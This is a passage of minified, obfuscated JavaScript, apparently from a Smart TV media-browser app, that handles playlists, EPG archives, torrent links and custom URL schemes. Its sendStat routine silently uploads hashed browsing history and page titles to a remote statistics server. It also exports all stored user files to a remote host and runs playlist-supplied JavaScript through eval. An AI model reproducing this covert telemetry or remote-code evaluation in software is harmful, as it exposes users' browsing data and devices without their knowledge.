if(pq.elCh.before)c.channels[j].before=pq.elCh.before+gV(c.channels[j],"before");if(pq.elCh.after)c.channels[j].after=pq.elCh.after+gV(c.channels[j],"after");pq.elCh.before=pq.elCh.after="";if(gV(c.channels[j],"iframe")!="")c.channels[j].iframe=pq.elCh.iframe}
c.channels[j].sourceurl=c.lII1I1PVBuI1lIlYpr;if(x!=null){if(gV(x,"br"))c.channels[j].br=gV(x,"br");x=null}
if(isNaN(xp[0])||xp[0]<1||xp[0]>jpush||gV(c.channels[j],"iframe")!=""){c.l11I101vQBOw0llIYpr.page.channels.splice(c.IFRAMES_INSERT++,0,c.channels[j]);jpush++}else c.l11I101vQBOw0llIYpr.page.channels.push(c.channels[j])}
break}}}
if(c.lII1I1PVBuI1lIlYpr=="cmdEpg")c.is_iptv=3;if(c.is_iptv>2){if(gV(c.global,"url_tvg")!=""){fEpg.loadxmltv(gV(c.global,"url_tvg"),c);fEpg.add(c,3000)}else fEpg.add(c);if(maJor.params.get("sortiptv")>0&&c.lII1I1PVBuI1lIlYpr.indexOf("http")==0)c.channels.sort(function(a,b){var str1=a.title;var str2=b.title;if(maJor.params.get("sortiptv")==2){if(str1.charCodeAt(0)<256&&str1.charCodeAt(0)>57)str1="яя"+str1;if(str2.charCodeAt(0)<256&&str2.charCodeAt(0)>57)str2="яя"+str2}
try{var rx=/([^\d]+|\d+)/ig;var str1split=str1.match(rx);var str2split=str2.match(rx);for(var i=0,l=Math.min(str1split.length,str2split.length);i<l;i++){var s1=str1split[i],s2=str2split[i];if(s1===s2)continue;if(isNaN(+s1)||isNaN(+s2)){return s1>s2?1:-1}else return+s1-s2}}catch(e){return 0}
return 0});if(maJor.params.get('sortiptv')==3){for(var index=0;index<c.channels.length;index++){c.channels[index].origsel=index}
c.ordchannels=l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(c.channels));try{c.channels=reordered(c.channels)}catch(e){kjtYpr.inf("Error sorting channels: "+e.message,2000)}}}
if(c.llIl1100glLO10l1Ypr){c.l11I101vQBOw0llIYpr.page.renderChannels(getSelect(),"update");c.cancel()}else{if(gV(c.global,"icon")=="")c.global.icon=pq.elCh.logo_30x30;if(gV(c.global,"title")=="")c.global.title=pq.elCh.title;if(c.group.length>0){c.group.unshift("_FPALL_");c.origchannels=l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(c.channels));c.listGroup()}
if(!pq.goBack){if(pq.l11I101vQBOw0llIYpr.get("url")==c.lII1I1PVBuI1lIlYpr){pq.l11I101vQBOw0llIYpr.put("img",c.global.icon);pq.l11I101vQBOw0llIYpr.put("title",c.global.title)}else{if(pq.l11I101vQBOw0llIYpr.get("url").indexOf("#group=")>0&&pq.l11I101vQBOw0llIYpr.get("url").split("#group")[0]==c.SAVE_lII1I1PVBuI1lIlYpr.split("#group")[0]){pq.l11I101vQBOw0llIYpr.put("title",c.global.title);pq.l11I101vQBOw0llIYpr.put("url",c.SAVE_lII1I1PVBuI1lIlYpr)}else{pq.l11I101vQBOw0llIYpr.put("s",pq.elCh.index);pq.l11I101vQBOw0llIYpr.put("top",gV(pq,"top"));var x={"url":c.SAVE_lII1I1PVBuI1lIlYpr,"img":c.global.icon,"title":c.global.title};if(gV(pq.elCh,"local")!=="")x.l=pq.elCh.local;if(gV(pq.origelCh,"parser")!=="")x.p=pq.origelCh.parser;if(gV(pq.origelCh,"parser2")!=="")x.p2=pq.origelCh.parser2;if(gV(pq.origelCh,"mb_parser")!=="")x.mp=pq.origelCh.mb_parser;pq.l11I101vQBOw0llIYpr.history.push(x);pq.l11I101vQBOw0llIYpr.fwhistory=[]}
pq.l11I101vQBOw0llIYpr.save()}
if(typeof pq.elCh.search=="object"||(c.SEARCH_TEMPL.indexOf("%s")>0&&gV(pq.inputed,"text")!=""&&gV(pq.elCh,"title").match(/(поиск|search|искать|найти|пошук)/i)&&!is_local(c.lII1I1PVBuI1lIlYpr))){if(c.IFRAMES.length)var p="iframe";else p="site";title=pq.elCh.title;img=pq.elCh.logo_30x30;var x=pq.l11I101vQBOw0llIYpr.get(null,-2);if(x!=null)if(!l0O0l0111mJXG1OII1OYpr(x.url)){if(x.title.length<15)title=x.title+" "+title;img=gV(x,"img")}
if(typeof pq.elCh.search=="object"){if(gV(pq.elCh.search,"title")!="")title=gV(pq.elCh.search,"title");if(gV(pq.elCh.search,"icon")!="")img=gV(pq.elCh.search,"icon");if(gV(pq.elCh.search,"playlist_url")!="")c.SEARCH_TEMPL=gV(pq.elCh.search,"playlist_url")}
c.addToSearchHist(c.SEARCH_TEMPL,p,title,img,pq)}}
margin=0;c.renderPage(pq)}
c.sendStat(-1,pq)},openUrl:function(pq,xml_url){var c=this;if(xml_url.match(/^(\/|usb:\/\/)/)){pq.elCh.local="direct";c.xhr=uHelper.create("directnoheader")}else c.xhr=uHelper.create("direct|rf|xml");c.xhr.ua=navigator.userAgent;c.xhr.parse=function(s){statusbar("off");clearTimeout(c.tTimer);if(c.canceled){return}
pq.source=s;c.oncomplete(pq)}
if(xml_url=="http://cloudflare.appfxml.com/browseraccount/?do=fexport#POSTs=userdata"){if(maJor.user){var g="";for(var i in allfs){var s=maJor.read(allfs[i]);g+=s+"[-..-]"}
xml_url=xml_url.replace("userdata",mB64.encrypt(g))+"&rev=4"}else{c.cancel();kjtYpr.inf("Need login!",1500)}}
var ref=gV(pq.l11I101vQBOw0llIYpr.page,"lII1I1PVBuI1lIlYpr");if(ref==xml_url||ref.indexOf("http")!=0)ref="";statusbar(xml_url,"link");if(pq.elCh.timeout)c.xhr.atime=pq.elCh.timeout*1000;if(xml_url.indexOf("=postmd5")>0){if(xml_url.indexOf("#POST")>0)xml_url+="&"+"postmd5="+encodeURIComponent(pq.elCh.postmd5);else xml_url+="#POSTpostmd5="+encodeURIComponent(pq.elCh.postmd5)}
c.URL_REQUEST=xml_url;if(xml_url.indexOf("#POST")>0){c.xhr.postdata=xml_url.split("#POST")[1];xml_url=xml_url.split("#POST")[0]}
if(!is_local(xml_url)&&maJor.params.get("headers")>0&&ref){if(maJor.platform()=="maple"&&!maJor.box_low)c.xhr.addheaders["Save-Data"]=ref;else c.xhr.addheaders.Accept=ref}
if(pq.elCh.local!="direct"&&!xml_url.match(/(pastebin\.com)/)){xml_url=maJor.addident(xml_url);if(pq.refresh&&xml_url.indexOf("&refresh=true")==-1){pq.refresh=!1;xml_url+="&refresh=true"}
xml_url=xml_url.replace(/#submenu\d+$/,"")}
c.xhr.get(xml_url);if((c.parentURL.indexOf("searchEngines|")==0||(xml_url.match(/(lnka\.ru|fxmlparsers\.ru|fxmlparsers\.in\.net)\//)&&xml_url.indexOf("search")==-1))&&maJor.timestamp<=0){if(is_xxx()||is_xxx(xml_url)){}else if(!maJor.user)var mes="<span style='float: left;margin: 4px;background-color: #b5bdc3; font-size: 23px;text-align: left;border-radius: 5px;    padding: 0px 7px 5px 7px;'>x</span>Войдите в свой Профиль, это поможет не потерять ваши данные!";else if(maJor.timestamp>-4&&mmes<15000){mes="От: cloudflare.appfxml.com<br><span style='text-align: left;color:orange'>_FPDonate to browser development in Profile_!</span>";mmes++}else mes="";if(mes!=""){c.tTimer=setTimeout(function(){hint(mes,"kb6")},200)}}},sendStat:function(m,pq){var c=this;if(maJor.box_low)return;if(m==-1){if(seSt.length){clearTimeout(stSend);stSend=setTimeout(function(){uHelper.create("directnoheader").hid().getI("http://browser.appfxml.com/gstatic.php?id=spiderSearches&ver=12&#POSTs="+encodeURIComponent(ll1lI1lI0sl0OlIYpr(seSt)));seSt=[]},25000)}
if(!c.sendedstat){if(pq.elCh.type=="enterurl"){hint('<img style="float: left;						    margin: 2px 6px 0px 0px;				    width: 25px;				    height: 25px;				    background: #9e9e9e;" src="https://raw.githubusercontent.com/komivp/appinfodl/main/static/page_fav_off_white.png">'+"Добавьте этот сайт в закладки или Стартовое меню, чтоб не потерять его!","kb5");uHelper.create("directnoheader").hid().getI("http://browser.appfxml.com/gstatic.php?id=spiderStat&m="+((c.channels.length&&c.ERR==null)?"c":"f")+"&ver=3#POSTs="+encodeURIComponent(c.lII1I1PVBuI1lIlYpr)+"&img="+encodeURIComponent(c.icon))}else if(c.ERR==404||c.channels.length==0){uHelper.create("directnoheader").hid().getI("http://browser.appfxml.com/gstatic.php?id=spiderStat&m=e&ver=3#POSTs="+encodeURIComponent(c.lII1I1PVBuI1lIlYpr)+"&parent="+encodeURIComponent(c.parentURL)+"&img="+encodeURIComponent(c.icon))}}
c.sendedstat=1}else if(!c.sendedstat2){var n=0,u="",t="";for(var i=IlO11lQ0().history.length-1;i>-1;i--){if(IlO11lQ0().history[i].url.indexOf("about")==0){n=i;break}}
var sp=[],sendsp=0,is_x=0;if(m==0)sendsp=-2;for(i=n+1;i<IlO11lQ0().history.length;i++){if(u!="")u+="-";if(t!="")t+="-|-";var ur=IlO11lQ0().history[i].url.replace(/http.*?\/treeview/,"http://remotefork/treeview");u+=md5(ur);t+=IlO11lQ0().history[i].title;var ks=IlO11lQ0().history[i];if(sendsp==0)sendsp=1;if(ks.url.indexOf("http")!=0||(is_local(ks.url)&&maJor.params.get("remote")&&maJor.params.get("remoteactive"))){sendsp=-1;continue}
if(is_xxx(ks.url))is_x=1;var tim=ks.img;if(ks.url.match(/(#submenu|no_save)/))continue;else if(ks.url.indexOf("alexkdpulg.php?list=")>0)var tu=unescape(ks.url.split("?list=")[1]);else if(ks.url.indexOf("alexkdpulg.php")>0){sendsp=-1;continue}else tu=ks.url;if(tu.lastIndexOf("?")==tu.length-1)tu=tu.substr(0,tu.length-1);tu=tu.replace(/[\?&#](iu=|bc=true|box_mac=).*/,"");var ttl=maJor.fp(ks.title);var tmp={"url":tu,"title":ttl,"img":tim};if(tmp.url.length<120)sp.push(tmp)}
if(tp>0.15){return}
if(ttmac)kjtYpr.popUp("Send SendSP="+sendsp,1500);if(sendsp==1&&m==1)uHelper.create("directnoheader").hid().getI("http://browser.appfxml.com/gstatic.php?id=add3#POSTs="+encodeURIComponent(ll1lI1lI0sl0OlIYpr(sp)));else{}
var tp=Math.random();uHelper.create("directnoheader").hid().getI("http://browser.appfxml.com/gstatic.php#POSTu="+u+"&m="+m+"&t="+encodeURIComponent(t));c.sendedstat2=1}},toSource:function(pq){var c=this;var u=c.lII1I1PVBuI1lIlYpr;var source=gV(c.l11I101vQBOw0llIYpr.page,"source");if(source==""){var d=c.l11I101vQBOw0llIYpr.page.global;d.channels=c.l11I101vQBOw0llIYpr.page.channels;source=ll1lI1lI0sl0OlIYpr(d)}
if(u.indexOf("no_save")>0)u=u.substring(0,Math.ceil(u.length-u.length/2.5));var r=/\\u([\d\w]{4})/gi;var style={"width":"98%","height":"100%","left":css_w(10)+"px","top":css_wh(10)+"px","textAlign":"left"};pq.data={};pq.data.before="<textarea id='scrolltextarea' style='overflow-y:scroll;width:100%;background-color:#eeeeee;color:black;height:610px;'>"+source.replace(/no_save/g,"").replace(r,function(match,grp){return String.fromCharCode(parseInt(grp,16))})+"</textarea>";c.toChannels(pq)},listGroup:function(sel){var c=this;var t=c.lII1I1PVBuI1lIlYpr.split("#group=");if(sel==null){var submenu=[];for(var i=0;i<c.group.length;i++){var el={"title":"<span style='color:white;'>"+c.group[i]+"</span>","playlist_url":"group="+i};if(c.menu.length<9)c.menu.push(el);else submenu.push(el)}
if(submenu.length)c.menu.push({"title":"<span style='color:white;'>...</span>","playlist_url":"submenu","submenu":submenu});if(t.length>1)c.listGroup(t[1])}else{if(sel<0)sel=c.group.length-1;else if(sel>c.group.length-1)sel=0;chGroupSel=sel;for(var i=0;i<c.menu.length;i++){if(c.menu[i].playlist_url.indexOf("group=")==0){if(c.menu[i].playlist_url.split("group=")[1]==sel)c.menu[i].title=c.menu[i].title.replace(/color:.*?;/,"color:black;");else c.menu[i].title=c.menu[i].title.replace(/color:.*?;/,"color:white;")}}
if(chGroupSel==0){c.channels=c.origchannels}else{c.channels=[];for(var i=0;i<c.origchannels.length;i++){var z=(c.origchannels[i].group||"").split(";");for(var j=0;j<z.length;j++){if(z[j]==c.group[chGroupSel]){c.channels.push(c.origchannels[i]);break}}}}
IlO11lQ0().focused(0)}},openCh:function(pq){var c=this;l11I101vQBOw0llIYpr=pq.l11I101vQBOw0llIYpr;if(l11I101vQBOw0llIYpr==null)l11I101vQBOw0llIYpr=IlO11lQ0();c.l11I101vQBOw0llIYpr=l11I101vQBOw0llIYpr;modeGroup=!1;if(handler=="move"||(handler=="player"&&rek_url!=""))return;if($_("MenuCh").style.display=="block"){Menu=[];$_("MenuCh","");$_("MenuCh").style.display="none";handler="menu"}
if(pq.inputed||$_("vk").style.display!="none"){if(gV(pq.elCh,"filter")!="answer")VK.close(1)}
chGroupSel=0;if(lIOl1101IHglt010lYpr>0){clearTimeout(lI1I011OJWglI1001OYpr);lIOl1101IHglt010lYpr=0;is_loadpage(-1);kjtYpr.inf("Прервано!",800);return}
elCh=l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(c.toTags(pq.elCh,pltags)));elGlobal=c.toTags(pq.elGlobal,pltags);if(elCh.onclick){if(elCh.onclick=="autouserexport()"){autoexport("user");setTimeout(function(){elCh.onclick="";pq.elCh=elCh;c.openCh(pq)},3000);return}}
c.parentCh=l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(elCh));if(!c.llIl1100glLO10l1Ypr)kjtYpr.lastSearch="";rek_mode=null;if(elCh.playlist_url.indexOf("group=")==0&&typeof c.l11I101vQBOw0llIYpr.page!="undefined"){var g=elCh.playlist_url.substr(6);var gu=c.l11I101vQBOw0llIYpr.page.SAVE_lII1I1PVBuI1lIlYpr.split("#group")[0];if(typeof prev[gu]!="undefined"){c.lII1I1PVBuI1lIlYpr=c.SAVE_lII1I1PVBuI1lIlYpr=gu+"#group="+g;pq.data=prev[gu];c.toChannels(pq);return}}
if(elCh.stream_url.match(/\.torrent$/)&&elCh.stream_url.indexOf("torrent://")!=0){elCh.playlist_url="torrent://"+elCh.stream_url;elCh.stream_url=""}
if(elCh.stream_url.match(/^(torrent|magnet:|cmd:)/)){elCh.playlist_url=elCh.stream_url;elCh.stream_url=""}
var ar=["playlist_url","stream_url","parser","parser2","mb_parser"];for(elem in ar)elCh[ar[elem]]=trylink(gV(elCh,ar[elem]));ar=["parser","parser2","mb_parser"];for(tag in ar){if(elCh[ar[tag]]){var params={"ch":elCh,"pq":pq,"tag":ar[tag]};params.callback=function(a_pq){c.openCh(a_pq)}
return c.l11l00IIjOd10IIOYpr(params)}}
if(c.preOpen(pq)){is_loadpage(0);return}
if(elCh.playlist_url.indexOf("cmd:")==0){c.handlerData({"data":{"cmd":elCh.playlist_url.substr(4)}},l11I101vQBOw0llIYpr.lII1I1PVBuI1lIlYpr);return c.cancel()}
c.SEARCH_TEMPL="";if(elCh.stream_url+elCh.playlist_url.indexOf("SearchName")==0){}else if(elCh.playlist_url!=""&&elCh.stream_url==""){if(elCh.playlist_url.indexOf("view-source:")==0){if(typeof prev[elCh.playlist_url]=="undefined"){if(elCh.playlist_url.substr(12)==c.parentURL){return c.toSource(pq)}else{elCh.playlist_url=elCh.playlist_url.substr(12);pq.tosource=1}}else pq.tosource=1}
pl_serv=0;pl_count=1;while(gV(elCh,"playlist_url"+(1+pl_count))!="")pl_count++;if(maJor.app_cors&&elCh.playlist_url.indexOf("alexkdpulg.php?list=")>0){elCh.playlist_url=decodeURIComponent(elCh.playlist_url.split("?list=")[1])}
if(this.xhr!=null){delete this.xhr}else{var xml_url=elCh.playlist_url;if(pq.inputed){if(xml_url.indexOf("{search}")!=-1){c.SEARCH_TEMPL=xml_url.replace("{search}","%s");xml_url=xml_url.replace("{search}",encodeURIComponent(pq.inputed.text))}else{c.SEARCH_TEMPL=sU(xml_url,"search=%s");xml_url=sU(xml_url,"search="+encodeURIComponent(pq.inputed.text))}
c.SAVE_lII1I1PVBuI1lIlYpr=xml_url}
c.lII1I1PVBuI1lIlYpr=xml_url;var data=0;if(xml_url.indexOf("about:")===0){data=getVars(xml_url,pq)}else if(xml_url.match(/^(zakladki|bookmarks)/)){data=xhr_bookmark(xml_url)}
if(data!==0){if(data==null){if(xml_url.match(/^(zakladki|bookmarks)/))kjtYpr.inf("_FPZdesPusto_!",1000);return c.cancel()}else{pq.data=data;c.toChannels(pq);statusbar("off")}}else if(xml_url.indexOf("alert(")==0||xml_url.indexOf("javascript:alert(")==0){confirmed.create(xml_url.match(/alert\((.*)\)/)[1],c.l11I101vQBOw0llIYpr.page.XML_DOMAIN,"OK")}else if(xml_url.indexOf("#archive|")>0){c.lII1I1PVBuI1lIlYpr=c.SAVE_lII1I1PVBuI1lIlYpr=xml_url;var mc=xml_url.split("#archive|");var d=mc[1].split("|");var ch=[];pq.l11I101vQBOw0llIYpr.put("s",getSelect());pq.l11I101vQBOw0llIYpr.put("top",gV(pq,"top"));if(d[1]==""){kjtYpr.inf("Нету телепрограммы! Запустите канал и перематывайте вручную",1800);return}else{if(d[1].indexOf("xmltv-")==0){if(typeof(JtvSRC)=="undefined")JtvSRC={};JtvSRC[md5(mc[0]).substr(0,7)]=mc[0];var u="http://exec4.remotecurl.spiderxml.com/curl/epg.php?do=xmltv&ver=2&cmd=epg&src="+encodeURIComponent(ll1lI1lI0sl0OlIYpr(JtvSRC))+"&mode=full&get="+d[1]+"&start="+d[2]}else u="http://85.17.30.89/common/sip.php?do=full&ver=2&get="+encodeURIComponent(d[1])+"&start="+d[2];xhrt=new XMLHttpRequest();ch.description+="<center><img id='bloading' src='"+_img("_ST_b_loading.gif")+"' width=15 /></center>";if(handler!="vk")$_("description",ch.description);xhrt.onreadystatechange=function(){if(xhrt.readyState==4){is_loadpage(0);if(c.canceled){return}
var ch=[];var m=l0OIIlIIlONuu1111Ypr(xhrt.responseText);if(m!=null){if(typeof m[d[1]]=="object"){nj="";while(typeof m[d[1]]["title"+nj]!="undefined"){var au=mc[0];if(d[3]=="default"&&d[4]!==""){au=d[4].replace("${start}",m[d[1]]["start"+nj]).replace("${timestamp}",T.timestamp).replace("${offset}",T.timestamp-m[d[1]]["start"+nj])}else if(d[3]=="append"&&d[4]!==""){au+=d[4].replace("${start}",m[d[1]]["start"+nj]).replace("${timestamp}",T.timestamp).replace("${offset}",T.timestamp-m[d[1]]["start"+nj])}else if(d[3]=="flussonic"||d[3]=="fs"||d[3]=="flussonic-hls"){au=au.replace(/([^\?]*\/)([^\?]*?)(\.|\?|$)(.*)/,"$1$2-"+m[d[1]]["start"+nj]+"-10800$3$4")}else if(d[3]=="shift"||1){if(mc[0].indexOf("?")>0)au+="&";else au+="?";au+="utc="+m[d[1]]["start"+nj]+"&lutc="+T.timestamp}
if(T.timestamp>m[d[1]]["start"+nj])
ch.unshift({"title":dt(m[d[1]]["start"+nj],!0)+" - "+dt(m[d[1]]["end"+nj])+"</span> "+m[d[1]]["title"+nj],"stream_url":au,"source_url":mc[0],"catchup":d[3],"catchup_source":d[4],"catchup_days":(-1*d[2]),"arcCurTime":m[d[1]]["start"+nj]});if(nj=="")nj=2;else nj++}
c.lII1I1PVBuI1lIlYpr=c.SAVE_lII1I1PVBuI1lIlYpr=xml_url+"|"}}
var au=mc[0];var def15=T.timestamp-900;if(d[3]=="default"&&d[4]!==""){au=d[4].replace("${start}",def15).replace("${timestamp}",T.timestamp).replace("${offset}",T.timestamp-def15)}else if(d[3]=="append"&&d[4]!==""){au+=d[4].replace("${start}",def15).replace("${timestamp}",T.timestamp).replace("${offset}",def15)}else if(d[3]=="flussonic"||d[3]=="fs"||d[3]=="flussonic-hls"){au=au.replace(/([^\?]*\/)([^\?]*?)(\.|\?|$)(.*)/,"$1$2-"+def15+"-10800$3$4")}else if(d[3]=="shift"||1){if(mc[0].indexOf("?")>0)au+="&";else au+="?";au+="utc="+def15+"&lutc="+T.timestamp}
ch.unshift({"title":"15 минут назад","stream_url":au,"source_url":mc[0],"catchup":d[3],"catchup_source":d[4],"catchup_days":(-1*d[2]),"arcCurTime":def15});data={"title":"_FPArchive_ "+d[0],"channels":ch};pq.data=data;c.toChannels(pq)}};xhrt.open('GET',u,!0);xhrt.send();is_loadpage(1)}}else if(xml_url.indexOf("AddFavorite(")==0){var m=xml_url.match(/AddFavorite\((.*?)\)/)[1];if(m==""){insetSelect=insetCount+1;IlO11lQ0().focused(-1);IlO11lQ0().focused(-1);kjtYpr.llI0IOruD0IOI1IYpr("favmenu")}else{m=m.split(",");if(m.length==3){favarray={};favarray.stream_url="";favarray.search_on="";favarray.playlist_url=m[2];favarray.title=m[0];favarray.logo_30x30=m[1];insetSelect=insetCount+1;IlO11lQ0().focused(-1);IlO11lQ0().focused(-1);kjtYpr.llI0IOruD0IOI1IYpr("favmenu")}else kjtYpr.inf("Error format! Must be AddFavorite(title,icon,url); or AddFavorite();",2000)}}else if(xml_url.indexOf("AddSearch(")==0){var m=xml_url.match(/AddSearch\((.*?)\)/)[1];m=m.split(",");if(m.length==3){FXMLPage.addGl(m[2],null,m[0],m[1])}else kjtYpr.inf("Error format! Must be AddSearch(title,icon,url search);",2000)}else if(xml_url.indexOf("app://")==0){var ch=pq.elCh;confirmed.create("Приложение появится в смартхаб<br>"+ch.title,"Установить данное приложение?");confirmed.fun0=function(){var c=ch.playlist_url.substring(6);setTimeout(function(){is_loadpage(1);if(c.indexOf("http")==0)vPlayer.maple.savezipfile(c,ch.title);else{vPlayer.maple.savezipfile("http://obovse.ru/widget/app/"+c)}},500)}}else if(xml_url.indexOf("cmdsetWeatherId")==0){maJor.params.set("weather",xml_url.substring(15));$_("weather").style.display="none";updateWeather()}else if(xml_url.indexOf("extensions://")==0){c.lII1I1PVBuI1lIlYpr=c.SAVE_lII1I1PVBuI1lIlYpr=xml_url;kjtYpr.l1OQ10vaPl11l1Ypr({"channels":[{"title":"Run extension...","playlist_url":xml_url}]},select,request_id);$_("ext").style.display="block";if(xml_url.indexOf("xsmart")>0)$_("ext",'<iframe id="frame-id" style="margin-top: 0px; border:none; -webkit-transform: scaleX(1.13);" width="1280" height="640" src="'+xml_url.split("extensions://")[1]+'" />');else $_("ext",'<iframe id="frame-id" style="margin-top: 0px; border:none; " width="1280" height="640" src="'+xml_url.split("extensions://")[1]+'" />');$(document.getElementById('frame-id').contentWindow.document).keyup(function(e){if(e.keyCode==37){i--}});kjtYpr.popUp("<img width='55' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> "+"Запущено расширение<br>"+"Меню - Закрыть расширение<br>"+"CH UP / CH DOWN - Открыть другую вкладку"+"",2000);ext_focus()}else if(xml_url.indexOf("payd_")==0){if(pq.elCh.menu)return kjtYpr.llI0IOruD0IOI1IYpr("onlymenu");var val=pq.inputed?pq.inputed.text:gV(pq.elCh,"value");gP().channels[pq.elCh.index].value=gP().input[pq.elCh.playlist_url.substring(5)]=val;gP().count=0;gP().renderChannels(getSelect());IlO11lQ0().focused()}else if(xml_url.indexOf("game://")==0){var c=xml_url.substring(7);tgame=c;setTimeout(function(){eval(c+"();");kjtYpr.popUp("<b>Управление:</b><br>ОК: Вверх<br>Вниз: Снижение")},300)}else if(xml_url.indexOf("html://")==0){confirmed.create("<b>"+xml_url.substring(7)+"</b>","_FPOpen URL? This application will be closed_").fun0=function(){gP().lII1I1PVBuI1lIlYpr=gP().SAVE_lII1I1PVBuI1lIlYpr=xml_url;lIIOOOa1ag001OIYpr();uHelper.create("directnoheader").hid().getI("http://185.158.114.122/obovse.ru/smarttv/spider.php?id=cmdSpiderStat&s="+encodeURIComponent(pq.elCh.playlist_url)+"&img="+gV(pq.elCh,"logo_30x30"));document.location=xml_url.substr(7)}}else if(xml_url.indexOf("javascript:")==0){eval("(function(){  try{"+xml_url.split("javascript:")[1]+"}catch(e){confirmed.create('Ошибка выполнения javascript:<br>'+e.message,gP().XML_DOMAIN);}  })();")}else if(xml_url=="submenu"){c.lII1I1PVBuI1lIlYpr=c.SAVE_lII1I1PVBuI1lIlYpr=c.l11I101vQBOw0llIYpr.page.lII1I1PVBuI1lIlYpr+"#submenu"+pq.elCh.index;pq.data=prev[c.l11I101vQBOw0llIYpr.page.SAVE_lII1I1PVBuI1lIlYpr.split("#submenu")[0].split("#group=")[0]];pq.data.returnSelect=0;c.toChannels(pq)}else if(xml_url.indexOf("cmdmenu")==0){kjtYpr.llI0IOruD0IOI1IYpr()}else if(xml_url=="cmdAbout"||xml_url=="cmdOpenStart"||xml_url=="cmdHelp"||xml_url.indexOf("cmdHistory")==0||xml_url.indexOf("cmdSetWeather")==0||xml_url.indexOf("cmdSetSearch")==0){kjtYpr.llI0IOruD0IOI1IYprPlay(xml_url)}else if(xml_url.indexOf("forkdlna")==0&&maJor.params.get("remoteip")==""){kjtYpr.popUp("_FPNeobhUstIzap_ Remote Forkplayer!")}else if(gV(pq.elCh,"js_url")!=""){clearInterval(kjtYpr.IntervalUpdateTime);clearInterval(kjtYpr.GlUpdateTime);l1OO1III0XvIvOlII1lYpr(pq.elCh.js_url)}else{if(xml_url.indexOf("xml://")==0)xml_url=xml_url.substring(6);if(xml_url.indexOf("torrent://")==0||xml_url.indexOf("magnet:")==0){var c1=xml_url.replace("torrent://","");if(maJor.params.get("torrserveactive")){if(parseFloat(torver)>=1.2)xml_url="http://"+getip("torrserve")+"/stream/playlists.m3u?link="+encodeURIComponent(c1)+"&m3u";else xml_url="http://"+getip("torrserve")+"/torrent/play?m3u=true&link="+encodeURIComponent(c1)}else if(maJor.params.get("aceactive"))xml_url="http://"+getip("acestream")+"/server/api?method=get_media_files&url="+encodeURIComponent(c1);else if(maJor.build>=7){elCh.url=c1;lIOI1Iljvp11I0Ypr(elCh);return}else return remoteAsk()}else if(xml_url.indexOf("torrentb64://")==0){if(maJor.params.get("aceactive")){c.xhr=uHelper.create("direct");c.xhr.parse=function(s){var data=l0OIIlIIlONuu1111Ypr(s);if(gV(data,"id")!="")c.openUrl(pq,"http://"+getip("acestream")+"/server/api?method=get_media_files&content_id="+data.id);else kjtYpr.inf("Error get acestream content id",1500)}
c.xhr.postdata="data="+encodeURIComponent(xml_url.substring(13));c.xhr.get("http://api.torrentstream.net/upload/json")}else remoteAsk()}
if(xml_url.indexOf("hms")==0){is_type="hms";var data={"playlist_name":"","channels":[]};if(xml_url=="hms"){data.channels.push({"title":"_FPNastroiki_ HMS!","playlist_url":"hms://settings","logo_30x30":"none"});if(maJor.params.get("remoteip")==""){kjtYpr.popUp("_FPNeobhUstIzap_ Remote Forkplayer!");return""}else{maJor.params.set("hms",maJor.params.get("remoteip").split(":")[0]+":45397");xml_url="http://"+maJor.params.get("hms")+"/MediaServer/Folders/0?start=0;count=0"}}}
if(xml_url.indexOf("forkdlna")==0)xml_url="http://"+getip("remoteip")+"/treeview?/";if(xml_url.indexOf("tv/wlist.php")>-1)kjtYpr.popUp("Fork Store App Market<br>_FPPrilUstSh_");c.lII1I1PVBuI1lIlYpr=xml_url;var ref=pq.l11I101vQBOw0llIYpr.get("url",-2);if(ref=="")ref=c.lII1I1PVBuI1lIlYpr;if(ref.indexOf("http")!=0||ref.match(/(filmix)/))ref="";if(xml_url){if(xml_url.match(/payd=on(&|$)/)){for(var i in pq.input){xml_url=sU(xml_url,"&payd_"+i+"="+encodeURIComponent(pq.input[i]))}}else if(xml_url.indexOf("=payd_")>0){for(var i in pq.input){xml_url=xml_url.replace("=payd_"+i,"="+encodeURIComponent(pq.input[i]))}}
c.openUrl(pq,xml_url)}
if(xml_url.indexOf("box_user")>0)xml_url=xml_url.replace(/box_user/g,"box_user2");if(xml_url.indexOf("box_mac")>0)xml_url=xml_url.replace(/box_mac/g,"box_mac2")}}}else if(elCh.stream_url!=""){pq.l11I101vQBOw0llIYpr.put("s",pq.elCh.index);pq.l11I101vQBOw0llIYpr.put("top",gV(pq,"top"));pq.l11I101vQBOw0llIYpr.save();if(is_audio(elCh.stream_url)&&maJor.params.get('audioplayer')>0&&!pq.mode){vPlayer.audio.play(pq.l11I101vQBOw0llIYpr.page.channels,getSelect());return c.cancel()}
elCh.url=elCh.stream_url.replace(/\\\//g,"/");elCh.openwith=pq.mode;elCh.pq=pq;if(!c.adv(pq))vPlayer.stream.create(elCh)}else{c.cancel();kjtYpr.inf("Пустая ссылка!",1500)}},};var uParser={create:function(method){},};var markedObj={cancel:function(p){if(p==null)var curPage=gP();else curPage=p;if(curPage!=null){for(var i=0;i<curPage.channels.length;i++){if(curPage.is_mark_array[i]){$_("titleid"+i).style.color="";$_("titleid"+i).style.fontWeight="";$_("titleid"+i).style.border=""}}}
curPage.is_mark_array={};curPage.marked=0;curPage.is_mark=0},entries:function(fun){var curPage=gP();if(!curPage.is_mark){try{fun(curPage.channels[getSelect()],getSelect())}catch(e){}}else{for(var i=0;i<curPage.channels.length;i++){if(curPage.is_mark_array[i]){try{fun(curPage.channels[i],i)}catch(e){}}}}
return this}}
function arrDelValue(a,v){for(var i in a){if(a[i]==v)a.splice(i,1)}
return a}
var rid=0,rcurlUrl="",lastUrl={};var uHelper={create:function(method,ccount){try{if(method==null)method="direct|rf|xml";var c=Object.create(this);c.request_id=++rid;c.method=method.split("|");if(method!="direct"&&method!="directnoheader"&&(maJor.params.get("remote")==0||!maJor.params.get("remoteactive")))c.method=arrDelValue(c.method,"rf");var nd=-1;for(var i in c.method){if(c.method[i].indexOf("direct")==0)nd=i;if(c.method[i]=="direct"&&maJor.params.get("headers")>0&&method.indexOf("directnoheader")==-1){c.method.splice((i+1),0,"directnoheader")}}
